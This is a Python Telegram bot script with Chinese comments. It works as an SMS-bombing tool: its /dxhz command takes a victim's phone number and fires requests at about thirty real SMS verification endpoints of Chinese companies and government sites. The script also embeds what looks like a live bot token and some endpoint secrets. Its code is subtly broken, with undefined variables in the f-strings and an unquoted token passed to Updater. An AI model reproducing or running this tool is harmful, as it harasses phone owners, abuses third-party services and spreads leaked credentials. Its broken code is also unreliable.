import os  # 引入 os 模块来读取环境变量
import requests
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# 从环境变量中读取 TELEGRAM_API_TOKEN
TELEGRAM_API_TOKEN = os.getenv("8139511082:AAFYL5BtHBxGaU9f9G2ihURBSBBN5592LgQ")

# 定义短信接口 URL 列表
urls = [
    f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={idcard}",
    f"https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={idcard}",
    f"https://cyhrsip.bjchy.gov.cn/mobileapi/authorization/oauth2/authorize?client_id=Bitech%5CH5&client_secret=vgkEeveppBwCzPHr&response_type=mobile&username={idcard}",
    f"https://lelife-api.axhome.com.cn/user/sendVerify?F=android&phone={idcard}&type=register",
    f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{idcard}",
    f"https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=14946&phone={idcard}",
    f"https://client5.uqbike.cn/sms/sendAuthCode.do?accountId=500374&phone={idcard}",
    f"https://api.huandian.cloud/sms?phone={idcard}&serverKey=qishou",
    f"https://core.xiuqiuchuxing.com/client/sms/sendAuthCode.do?accountId=301&phone={idcard}",
    f"https://zx.uwenya.cc/new_energy/server/api/web/?r=user/verify-code&appid=wx51cce9a13fc7dbf7&phone={idcard}&token=&v=4.1.2023080601",
    f"https://bike.ledear.cn/api/user/code?phone={idcard}&brandAreaId=1279",
    f"https://mapi-lx.zjcqkj.com/user/logon/verifyCode/{idcard}",
    f"https://api.dycxqc.com/user/logon/verifyCode/{idcard}",
    f"https://api.workdodo.com/czj/sys/open/sms/sendSms?sign=1727138418931&mobile={idcard}&sendType=1",
    f"https://isus.vip/cgi.sms.send?mobile={idcard}",
    f"https://wechatapp.baofengenergy.com:5022/pms/appLogin/code?phone={idcard}&isRegister=true",
    f"https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone={idcard}&type=1",
    f"https://bsx.baoding12345.cn/web/bduser/register?mobile={idcard}",
    f"https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone={idcard}&Captcha=&_=1627172292814",
    f"http://www.tanwan.com/api/reg_json_2019.php?act=3&phone={idcard}&callback=jQuery112003247368730630804_1643269992344&_=1643269992347",
    f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={idcard}&sign_type=1&use_type=1",
    f"https://maicai.api.ddxq.mobi/user/getSms?uid=&longitude=0&latitude=0&station_id=5500fe01916edfe0738b4e43&city_number=0101&api_version=11.27.1&app_version=4.27.1&channel=applet&app_client_id=4&s_id=05hv9hv42g516917y9339ygy8033yyuyofpi536h55v7y2lezfz883wuj54g5829&openid=osP8I0Wmck0hGvKW9vwKHweXabkM&device_id=osP8I0Wmck0hGvKW9vwKHweXabkM&h5_source=&time=1727040562&device_token=WHJMrwNw1k%2FHZDgtawYdgIsh8E%2Fwdbj66furLzNpFRvp5A2rzSGbKhTz9JeO6ELOoGTzJZ436JhQ9V96N7H4JAuMcB7Y6GWPadCW1tldyDzmauSxIJm5Txg%3D%3D1487582755342&mobile={idcard}&verify_code=&type=3&area_code=86&showData=true&app_client_name=wechat&nars=c51c84e76a3425e745d7e58dcfa5ba39&sesi=%7B%22sesiT%22%3A%22AEWLMUUa99456528bc9105603557ab27af4a0fe%22%2C%22sdkV%22%3A%222.0.0%22%7D",
    f"https://fyxrd.168fb.cn/master_renda/public/api/Login/sendsms?phone={idcard}&user_type=2",
    f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={idcard}",
    f"https://apis.niuxuezhang.cn/v1/sms-code?phone={idcard}",
    f"https://wccy-server.sxlyb.com/open/v1/login-code/{idcard}?phone={idcard}",
    f"https://mapi.ekwing.com/parent/user/sendcode?scenes=login&tel={idcard}&v=9.0&os=Windows",
    f"https://qxt.matefix.cn/api/wx/common/sendMsgCode?mobile={idcard}",
    f"https://www.huameitang.com/api.php?do=getMobileCode&mobile={idcard}",
    f"https://api.hichefu.com/client-openapi/driver/user/getVerifyCode?phone={idcard}",
    f"https://www.xinmeinet.cn/api/user/getMsg?status=1&touch={idcard}",
    f"http://n103.top:84/smsboom/?hm={idcard}",
]
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("欢迎使用短信轰炸机器人！使用 /dxhz [手机号] 命令来进行测试。")

def dxhz(update: Update, context: CallbackContext) -> None:
    if len(context.args) != 1:
        update.message.reply_text("请提供一个手机号！正确用法：/dxhz 12345678901")
        return

    idcard = context.args[0]
    update.message.reply_text(f"正在对手机号 {idcard} 进行短信轰炸测试...")

    for url in urls:
        try:
            full_url = url.format(idcard=idcard)
            response = requests.get(full_url)
            if response.status_code == 200:
                update.message.reply_text(f"请求成功: {full_url}")
            else:
                update.message.reply_text(f"请求失败: {full_url} - 状态码: {response.status_code}")
        except Exception as e:
            update.message.reply_text(f"请求错误: {url} - 错误信息: {e}")

    update.message.reply_text("短信轰炸测试完成。")

def main():
    updater = Updater(8139511082:AAFYL5BtHBxGaU9f9G2ihURBSBBN5592LgQ)
    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("dxhz", dxhz))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()